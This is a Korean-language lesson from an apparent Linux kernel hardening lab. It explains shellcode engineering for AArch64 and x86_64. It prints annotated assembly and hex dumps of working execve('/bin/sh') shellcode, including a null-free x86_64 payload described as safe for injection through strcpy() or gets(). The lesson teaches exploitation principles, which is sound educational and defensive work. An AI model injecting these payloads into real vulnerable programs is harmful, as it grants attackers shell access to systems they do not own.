# 04. 쉘코드 엔지니어링과 어셈블리 기계어 제작 (Shellcode Engineering)

바이너리 익스플로잇에서 CPU 제어권을 탈취한 공격자가 대화형 루트 쉘을 획득하기 위해 주입하는 순수 기계어 바이트 스트림인 **쉘코드(Shellcode)의 구조와 엔지니어링 제약**을 분석함. 현대 임베디드 및 디바이스 환경의 핵심인 **AArch64(ARM64)** 아키텍처를 기본(Default)으로 분석하며, **x86_64**와의 기계어 인코딩 특성을 비교함.

---

## 1. 학습 목표 및 개요

- 쉘코드의 본질이 컴파일러나 링커 없이 CPU가 직접 해독 가능한 순수 기계어 바이트(Opcode)임을 이해함.
- AArch64(`X8=221`, `svc #0`)와 x86_64(`RAX=59`, `syscall`)의 `execve("/bin/sh")` 시스템 콜 레지스터 규약을 규명함.
- 고정 4바이트 RISC(AArch64)와 가변 길이 CISC(x86_64) 간의 기계어 인코딩 메커니즘 차이를 분석함.
- 문자열 처리 함수(`strcpy`, `gets`)를 우회하기 위한 **Null Byte (`\x00`) 제거 기법**과 한계를 규명함.
- 하드코딩된 메모리 주소 없이 어디서나 구동 가능한 **위치 독립적 코드(Position-Independent Code / PIC)** 설계 기법을 학습함.

---

## 2. 인터랙티브 쉘코드 바이트코드 & 아키텍처 인스펙터

아래 다이어그램에서 AArch64와 x86_64 쉘코드의 16진수 바이트열과 각 어셈블리 인스트럭션이 레지스터를 조작하는 과정을 비교 탐색 가능함:

<div style="width: 100%; margin: 24px 0; border: 1px solid rgba(255,255,255,0.1); border-radius: 12px; overflow: hidden;">
  <iframe src="../../assets/diagrams/principles/04-shellcode.html" style="width: 100%; border: none; display: block; overflow: hidden;" scrolling="no" onload="try { const c = this.contentWindow.document.getElementById('diagramCanvas'); if(c) this.style.height = Math.ceil(c.getBoundingClientRect().height) + 'px'; } catch(e){}"></iframe>
</div>

---

## 3. 리눅스 `execve` 시스템 콜 규약: AArch64 vs x86_64

쉘코드의 최종 목표는 운영체제 커널의 `sys_execve` 시스템 콜을 발동시켜 프로세스 이미지를 `/bin/sh`로 교체하는 것임:

```c
int execve(const char *pathname, char *const argv[], char *const envp[]);
```

| 설정 항목 | AArch64 (ARM64 - 기본) | x86_64 (AMD64) |
| :--- | :--- | :--- |
| **시스템 콜 번호** | `X8` = 221 (`0xdd`, `__NR_execve`) | `RAX` = 59 (`0x3b`, `__NR_execve`) |
| **1st 인자 (`pathname`)** | `X0` = `"/bin/sh"` 문자열 주소 | `RDI` = `"/bin/sh"` 문자열 주소 |
| **2nd 인자 (`argv`)** | `X1` = `NULL (0)` 또는 `[&"/bin/sh", NULL]` | `RSI` = `["/bin/sh", NULL]` 주소 |
| **3rd 인자 (`envp`)** | `X2` = `NULL (0)` | `RDX` = `NULL (0)` |
| **커널 진입 명령어** | `svc #0` (Supervisor Call) | `syscall` |

---

## 4. 아키텍처별 쉘코드 엔지니어링 심층 비교

=== "AArch64 (ARM64 - 기본 타깃)"
    AArch64는 모든 명령어가 **4바이트 고정 크기(Fixed 32-bit)**로 인코딩되는 RISC 아키텍처임:

    ```assembly
    // [1] PC 상대 주소로 20바이트 뒤에 위치한 "/bin/sh" 문자열 주소를 X0에 적재
    adr    x0, #20              // 10 00 00 a0 (4바이트)
    // [2] X1(argv) 및 X2(envp)를 제로 레지스터(xzr)로 0 초기화
    mov    x1, xzr              // aa 1f 03 e1 (4바이트)
    mov    x2, xzr              // aa 1f 03 e2 (4바이트)
    // [3] 시스템 콜 번호 221(__NR_execve) 적재
    mov    x8, #0xdd            // d2 80 1b a8 (4바이트)
    // [4] 커널 공간으로 진입
    svc    #0                   // d4 00 00 01 (4바이트)
    // [5] 인라인 내장 문자열
    .string "/bin/sh"           // 2f 62 69 6e 2f 73 68 00 (8바이트)
    ```

    > [!IMPORTANT]
    > **AArch64의 Null-Byte 특성**:
    > AArch64 명령어는 32비트 고정 규격이므로 `svc #0`(`0xd4000001` ➔ `\x01\x00\x00\xd4`)이나 `adr` 명령어의 상위 비트필드에 필연적으로 `\x00` 바이트가 포함됨. 따라서 `strcpy()` 기반 공격 시에는 디코더 스텁(Decoder Stub)을 전치하거나, 현대 보안 환경처럼 소켓 `read()` / `recv()` 등 바이트 스트림 취약점을 타깃으로 주입함.

=== "x86_64 (AMD64 - 비교 타깃)"
    x86_64는 1~15바이트 가변 길이 CISC 아키텍처이므로 레지스터 조작 명령어를 선별하여 `\x00`을 100% 제거 가능함:

    ```nasm
    // [1] RAX 레지스터를 0으로 초기화 (Null 바이트 미발생)
    xor    %eax, %eax               // 31 c0
    // [2] 64비트 즉치값으로 "/bin//sh"를 RBX에 적재
    movabs $0x68732f2f6e69622f, %rbx// 48 bb 2f 62 69 6e 2f 2f 73 68
    // [3] 스택에 푸시하여 인라인 문자열 생성
    push   %rbx                     // 53
    mov    %rsp, %rdi               // 48 89 e7 (RDI = &"/bin//sh")
    // [4] argv 및 envp 설정
    push   %rax                     // 50 (NULL)
    mov    %rsp, %rdx               // 48 89 e2 (RDX = NULL)
    push   %rdi                     // 57 (&"/bin//sh")
    mov    %rsp, %rsi               // 48 89 e6 (RSI = argv)
    // [5] 시스템 콜 번호 59(0x3b) 주입 및 호출
    mov    $0x3b, %al               // b0 3b (하위 8비트 사용으로 Null 제거)
    syscall                         // 0f 05
    ```

---

## 5. 실습 소스 코드 및 바이트코드 검증

- **실습 소스 코드**: [`shellcode_tester.c`](../../assets/labs/principles/04-shellcode/shellcode_tester.c) (로컬 원본) | [GitHub 소스 코드 저장소 :octicons-mark-github-16:](https://github.com/auking45/linux-kernel-hardening-lab/blob/main/labs/principles/04-shellcode/shellcode_tester.c)
- **전용 Makefile**: [`Makefile`](../../assets/labs/principles/04-shellcode/Makefile)

### 5.1 쉘코드 바이트열 및 Null-Byte 검사

=== "AArch64 (기본 타깃)"
    ```bash
    cd labs/principles/04-shellcode
    make run
    ```

    ```
    === Running Shellcode Inspection on aarch64 ===
    qemu-aarch64 -L /usr/aarch64-linux-gnu ./shellcode_tester
    === Linux Kernel Hardening Lab - Shellcode Engineering ===

    ============================================================
     Shellcode Inspection [x86_64] (Total Length: 28 bytes)
    ============================================================
    [Hex Dump]
      \x31\xc0\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68
      \x53\x48\x89\xe7\x50\x48\x89\xe2\x57\x48\x89\xe6
      \xb0\x3b\x0f\x05

    [Analysis]
      [+] Null-Byte Check: PASSED (0 null bytes detected).
          Safe for injection into strcpy(), gets(), sprintf().
    ============================================================

    ============================================================
     Shellcode Inspection [ARM64] (Total Length: 28 bytes)
    ============================================================
    [Hex Dump]
      \xa0\x00\x00\x10\xe1\x03\x1f\xaa\xe2\x03\x1f\xaa
      \xa8\x1b\x80\xd2\x01\x00\x00\xd4\x2f\x62\x69\x6e
      \x2f\x73\x68\x00

    [Analysis]
      [-] Null-Byte Check: WARNING (5 null byte(s) detected).
    ============================================================
    ```

=== "x86_64 (비교 타깃)"
    ```bash
    cd labs/principles/04-shellcode
    make ARCH=x86_64 run
    ```

    - x86_64 네이티브 환경에서 동일하게 28바이트 Null-Free 바이트열 검증 수행.

---

## 6. 요약 및 다음 강의

- 쉘코드는 아키텍처별 시스템 콜 번호와 ABI 레지스터를 정확히 구성하여 커널에 직접 명령을 전달하는 최소 단위의 기계어 조각임.
- AArch64는 4바이트 고정 규격과 `adr` 상대 주소 참조를 사용하는 반면, x86_64는 가변 바이트와 스택 푸시를 활용해 Null-Free 페이로드를 구성함.
- 다음 강의에서는 이렇게 제작된 페이로드로 스택 경계를 무너뜨리고 제어 흐름을 장악하는 **[05. 클래식 버퍼 오버플로우와 RIP/PC 장악](05-stack-bof-rip.md)**을 학습함.
